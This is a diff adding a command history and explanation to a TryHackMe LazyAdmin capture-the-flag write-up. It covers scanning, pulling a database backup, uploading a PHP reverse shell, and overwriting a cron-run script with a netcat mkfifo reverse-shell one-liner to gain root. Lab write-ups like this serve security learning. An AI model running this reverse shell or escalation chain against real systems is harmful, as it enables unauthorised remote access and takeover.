@@ -450,8 +450,52 @@ THM{6637f41d0177b6f37cb20d775124699f}
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/TryHackMe%20-%20LazyAdmin.png)
 
 # Command History
+1. `nmap -sC -sV {TARGET-IP} > {FILENAME1}.txt`
+2. `cat {FILENAME1}.txt`
+3. `dirb http://{TARGET IP} > {FILENAME2}.txt`
+4. `cat {FILENAME2}.txt`
+5. `firefox "http://{TARGET IP}/content/inc`
+6. `firefox "http://{TARGET IP}/content/inc/mysql_backup/"`
+7. `cd ~/Downloads`
+8. `ls`
+9. `cat {BACKUP FILE}.sql`
+10. `firefox "https://crackstation.net/"`
+11. `firefox "http://{TARGET IP}/content/as"`
+12. `firefox "http://10.10.165.242/content/as/?type=ad"`
+13. `firefox "http://{TARGET IP}/content/inc/ads"`
+14. `git clone https://github.com/pentestmonkey/php-reverse-shell`
+15. `ls`
+16. `cd php-reverse-shell`
+17. `ls`
+18. `mousepad php-reverse-shell.php`
+19. `firefox "http://10.10.165.242/content/as/?type=ad"`
+20. `nc -lvnp {PORT NUMBER}`
+21. `firefox "http://10.10.165.242/content/inc/ads/"`
+22. `ls /`
+23. `ls /home`
+24. `cat /home/{USER}`
+25. `cat /home/{USER}/{USER FLAG}.txt`
+26. `sudo -l`
+27. `cat /home/{USER}/{FILENAME3}.pl`
+28. `cat /etc/{FILENAME4}.sh`
+29. `ls -li /etc/{FILENAME4}.sh`
+30. `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
+31. `nc -lvnp {PORT NUMBER}`
+32. `sudo /usr/bin/perl /home/itguy/backup.pl`
+33. `whoami`
+34. `ls /root`
+35. `cat /root/{ROOT FLAG}.txt`
 
 # Dissecting Some Commands
+`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MACHINE IP} {PORT NUMBER} >/tmp/f" > /etc/copy.sh`
++ `rm /tmp/f` to remove the file names "**/tmp/f**" if it exists
++ `mkfifo /thmp/f` to create a named pipe (FIFO) called "**/tmp/f**"
++ `cat /tmp/f | /bin/sh -i 2>&1 | nc {MACHINE IP} {PORT NUMBER} > /tmp/f` to establish a reverse shell connection to the specified IP address and port number
+    + `cat /tmp/f` to read the content of the "**/tmp/f**" named pipe
+    + `| /bin/sh -i 2>&1` to pipe the output of the previous command into a new ishell instance, which provides an interactive shell
+    + `| nc {MACHINE IP} {PORT NUMBER}` to pipe the output of the shell into the netcat command, which connects to the specified machine at the specified IP address and port number
+    + `>/tmp/f` to redirect the output of the netcat command back into the "**/tmp/f**" named pipe for further interaction
++ `/etc/copy.sh` to redirect the output of the **echo** command into the **copy.sh** file
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
